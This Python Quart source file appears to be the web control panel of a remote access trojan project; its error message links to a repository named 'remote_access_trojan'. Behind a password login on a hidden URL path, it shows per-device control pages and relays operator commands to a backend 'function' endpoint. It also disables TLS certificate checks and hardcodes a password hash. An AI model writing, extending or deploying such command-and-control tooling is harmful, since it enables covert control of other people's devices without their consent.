__author__ = "赵博凯"
__license__ = "GPL v3"

from quart import Quart, redirect, url_for, request, make_response, render_template, jsonify, websocket
import asyncio
import rich
from sys import exit
import logging
import requests

import rich.traceback 

# 配置Rich的回溯追踪功能
rich.traceback.install(show_locals=True)

# 基础配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
app = Quart(__name__)
WEB_HOST = "0.0.0.0"
WEB_PORT = 8000
API_SITE = 'http://localhost:5000'
SECURITY_PATH = 'fuck'  # 安全路径
SECURITY_PASSWORD_HASH = '6ac3c336e4094835293a3fed8a4b5fedde1b5e2626d9838fed50693bba00af0e'  # 密码哈希值

# 全局变量
url_root = f'{API_SITE}/{SECURITY_PATH}'  # API根URL

# 安全验证函数
def check(cookie):
    """验证用户cookie是否有效"""
    if requests.post(f"{url_root}/function", verify=False, cookies=cookie).status_code == 401:
        return False
    return True

# 主页路由
@app.route(f'/{SECURITY_PATH}/')
async def index():
    """显示主页，需要验证"""
    if not check(request.cookies): 
        return redirect(url_for('login'))
    return await render_template('index.html')

# 登录路由
@app.route(f'/{SECURITY_PATH}/login', methods=['GET', 'POST'])
async def login():
    """处理用户登录"""
    global headers
    if request.method == 'POST':
        form = await request.form
        password = form.get('password', '')
        response = requests.post(f"{url_root}/verify", json={"password": password})
        if "Cookie" in response.json():
            resp = await make_response(redirect(url_for('index')))
            resp.set_cookie('Cookie', response.json()["Cookie"])
            return resp
        return await render_template('login.html', error='密码错误')
    return await render_template('login.html')

# 登出路由
@app.route(f'/{SECURITY_PATH}/logout')
async def logout():
    """处理用户登出"""
    resp = await make_response(redirect(url_for('index')))
    resp.delete_cookie('Cookie')
    return resp

# 设备页面路由
@app.route(f'/{SECURITY_PATH}/device/<id>')
async def device(id):
    """显示设备控制页面"""
    if not check(request.cookies): 
        return redirect(url_for('login'))
    return await render_template('device.html', id=id, url_root=url_root)

# API请求转发路由
@app.route(f'/{SECURITY_PATH}/requests_to_function', methods=['POST'])
async def requests_to_function():
    """转发API请求到后端服务"""
    if not check(request.cookies): 
        return redirect(url_for('login'))
    json = await request.json
    response = requests.post(f"{url_root}/function", json=json, verify=False, cookies=request.cookies)
    return jsonify(response.json())

# 主程序入口
async def main():
    """启动Web服务"""
    logging.info("正在启动程序...")
    await asyncio.gather(
        app.run_task(host=WEB_HOST, port=WEB_PORT)
    )

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        logging.info("版权所有：Copyright © 赵博凯, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.warning("用户手动中断程序。")
        exit()
    except Exception as e:
        logging.error(f"错误: {e}，请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]")
